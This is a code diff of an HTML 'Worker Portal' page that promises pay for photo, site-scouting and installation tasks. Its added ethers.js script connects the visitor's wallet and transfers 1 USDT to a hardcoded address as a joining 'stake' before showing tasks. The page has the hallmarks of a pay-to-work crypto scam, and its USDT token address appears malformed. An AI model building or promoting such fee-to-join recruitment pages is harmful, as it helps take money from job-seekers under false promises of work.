@@ -1,124 +1,171 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="UTF-8">
-<title>Worker</title>
+    <meta charset="UTF-8">
+    <title>Worker Portal - Integrated</title>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.umd.min.js"></script>
 
-<style>
-body {margin:0;background:#0b0f14;color:white;font-family:Arial;}
-.container {max-width:800px;margin:auto;padding:20px;}
-.card {background:#141a22;padding:20px;margin-top:20px;border-radius:12px;}
-button {
-  width:100%;
-  padding:14px;
-  background:#00ffae;
-  border:none;
-  border-radius:10px;
-  cursor:pointer;
-}
-.task {
-  border-bottom:1px solid #333;
-  padding:10px 0;
-}
-.highlight {color:#00ffae;}
-</style>
+    <style>
+        body {margin:0;background:#0b0f14;color:white;font-family:Arial;scroll-behavior: smooth;}
+        .container {max-width:800px;margin:auto;padding:20px;}
+        .card {background:#141a22;padding:20px;margin-top:20px;border-radius:12px;border: 1px solid #252e3a;}
+        
+        /* 按钮样式整合 */
+        .btn-primary {
+            width:100%; padding:14px; background:#00ffae; border:none; border-radius:10px; 
+            cursor:pointer; color: #0b0f14; font-weight: bold; font-size: 16px; transition: 0.3s;
+        }
+        .btn-primary:hover { background: #00d4ff; box-shadow: 0 0 15px rgba(0,255,174,0.4); }
+        .btn-secondary {
+            width:100%; padding:10px; margin-top:10px; background:#1e2630; color:#00d4ff; 
+            border:1px solid #00d4ff; border-radius:8px; cursor:pointer;
+        }
+
+        .task { border-bottom:1px solid #333; padding:10px 0; }
+        .highlight {color:#00ffae;}
+        #portal-section { display: none; margin-top: 40px; border-top: 2px dashed #333; padding-top: 20px; }
+        .status-msg { margin-top: 10px; font-size: 14px; color: #888; }
+    </style>
 </head>
 
 <body>
 
 <div class="container">
+    <section id="intro-section">
+        <h1>👷 Earn by Completing Real-World Tasks</h1>
+        <p>No experience needed. No middleman. Paid after verification.</p>
 
-<h1>👷 Earn by Completing Real-World Tasks</h1>
+        <div class="card">
+            <h2>💰 What You Can Earn</h2>
+            <p>
+                📸 Take location photos → $10–20<br>
+                📍 Find installation site → $20–50<br>
+                🤝 Talk to landlord → $50–100<br>
+                🔧 Assist installation → $100+
+            </p>
+        </div>
 
-<p>
-No experience needed.<br>
-No middleman.<br>
-Paid after verification.
-</p>
+        <div class="card">
+            <h2>📋 Task Types</h2>
+            <p class="highlight">Entry Level</p>
+            <p>✔ Take photos | ✔ Upload videos | ✔ Basic checks</p>
+            <p class="highlight">Advanced</p>
+            <p>✔ Installation support | ✔ Local coordination</p>
+        </div>
 
-<div class="card">
-<h2>💰 What You Can Earn</h2>
+        <div class="card">
+            <h2>🔥 Open Tasks</h2>
+            <div class="task">📍 Jakarta – Take site photos | Reward: $20</div>
+            <div class="task">📍 Mumbai – Find location | Reward: $40</div>
+        </div>
 
-<p>
-📸 Take location photos → $10–20<br>
-📍 Find installation site → $20–50<br>
-🤝 Talk to landlord → $50–100<br>
-🔧 Assist installation → $100+
-</p>
+        <div class="card">
+            <button class="btn-primary" onclick="showPortal()">
+                🚀 Start Earning Now
+            </button>
+        </div>
+    </section>
+
+    <section id="portal-section">
+        <h2 style="color:#00d4ff;">⚙️ Worker Portal</h2>
+        
+        <div class="card">
+            <h3>Step 1: Authorization</h3>
+            <button class="btn-secondary" onclick="connect()">Connect Wallet</button>
+            <div id="wallet" class="status-msg"></div>
+        </div>
+
+        <div class="card">
+            <h3>Step 2: Security Deposit (Stake 1 USDT)</h3>
+            <p style="font-size: 12px; color: #888;">* Stake $1 to join the worker network.</p>
+            <button class="btn-primary" onclick="stake()">Stake Now</button>
+            <div id="stakeStatus" class="status-msg"></div>
+        </div>
+
+        <div class="card">
+            <h3>Step 3: Access Tasks</h3>
+            <button class="btn-secondary" onclick="loadTasks()">Refresh Task List</button>
+            <div id="tasks" style="margin-top:15px; font-size: 14px;"></div>
+        </div>
+    </section>
 </div>
 
-<div class="card">
-<h2>📋 Task Types</h2>
+<script>
+// ===== 配置信息 =====
+const USDT = "0xC2132D05D31c914a87C6611C10748AaCBdA6C62";
+const SAFE = "0xC8DF3B516616800b2709F66e1bee7520aBAbD4E2";
+const CONTRACT = "0xC93f3483C514a9ba22CdF2240B32734a69Bf17a2";
+const ABI = [
+  "function stakeFund(uint256 amount)",
+  "function tasks(uint256) view returns(address,uint256,uint256,bool)"
+];
 
-<p class="highlight">Entry Level</p>
-<p>
-✔ Take photos<br>
-✔ Upload videos<br>
-✔ Basic checks
-</p>
+let provider, signer, user;
 
-<p class="highlight">Intermediate</p>
-<p>
-✔ Talk to owners<br>
-✔ Collect info<br>
-✔ Verify sites
-</p>
+// ===== 页面逻辑 =====
+function showPortal() {
+    document.getElementById('portal-section').style.display = 'block';
+    window.scrollTo(0, document.getElementById('portal-section').offsetTop);
+}
 
-<p class="highlight">Advanced</p>
-<p>
-✔ Installation support<br>
-✔ Local coordination<br>
-✔ Maintenance
-</p>
-</div>
+// ===== 核心功能 (由原 newworker.html 整合) =====
+async function connect(){
+  try{
+    if (typeof window.ethereum === "undefined") {
+      alert("Please open in a Web3 browser or install MetaMask.");
+      return;
+    }
+    provider = new ethers.BrowserProvider(window.ethereum);
+    await provider.send("eth_requestAccounts", []);
+    signer = await provider.getSigner();
+    user = await signer.getAddress();
+    document.getElementById("wallet").innerText = "Connected: " + user;
+  } catch(e) {
+    alert("Connect error: " + e.message);
+  }
+}
 
-<div class="card">
-<h2>⚙️ How It Works</h2>
+async function stake(){
+  try{
+    if(!signer){ alert("Please connect wallet first"); return; }
+    
+    const token = new ethers.Contract(USDT, ["function transfer(address,uint256) returns(bool)"], signer);
+    let amount = ethers.parseUnits("1", 6);
 
-<p>
-1. Stake $1 to join<br>
-2. Pick a task<br>
-3. Complete & upload proof<br>
-4. Get paid
-</p>
-</div>
+    document.getElementById("stakeStatus").innerText = "Processing USDT transfer...";
+    let tx = await token.transfer(SAFE, amount);
+    await tx.wait();
 
-<div class="card">
-<h2>🔥 Open Tasks</h2>
+    document.getElementById("stakeStatus").innerText = "Recording stake on contract...";
+    const contract = new ethers.Contract(CONTRACT, ABI, signer);
+    let tx2 = await contract.stakeFund(amount);
+    await tx2.wait();
 
-<div class="task">
-📍 Jakarta – Take site photos<br>
-Reward: $20
-</div>
+    document.getElementById("stakeStatus").innerText = "✅ Stake Success! You are now a verified worker.";
+  } catch(e) {
+    document.getElementById("stakeStatus").innerText = "❌ Error: " + e.message;
+  }
+}
 
-<div class="task">
-📍 Mumbai – Find location<br>
-Reward: $40
-</div>
-
-<div class="task">
-📍 Kampala – Contact landlord<br>
-Reward: $60
-</div>
-
-</div>
-
-<div class="card">
-<h2>📈 Your Growth</h2>
-
-<p>
-Complete tasks → Build reputation<br>
-Higher score → Higher-paying tasks
-</p>
-</div>
-
-<div class="card">
-<button onclick="alert('Connect wallet → Start task')">
-🚀 Start Earning Now
-</button>
-</div>
-
-</div>
+async function loadTasks(){
+  try{
+    const contract = new ethers.Contract(CONTRACT, ABI, provider);
+    let html = "";
+    for(let i=0; i<5; i++){ // 演示展示前5个任务
+      try {
+        let t = await contract.tasks(i);
+        html += `<div class="task">
+            Task #${i} | Reward: ${Number(ethers.formatUnits(t[1],6))} USDT <br>
+            Status: ${t[3] ? "✅ Available" : "❌ Taken"}
+        </div>`;
+      } catch(e) { break; }
+    }
+    document.getElementById("tasks").innerHTML = html || "No active tasks found.";
+  } catch(e) {
+    document.getElementById("tasks").innerText = "❌ Load failed: " + e.message;
+  }
+}
+</script>
 
 </body>
 </html>
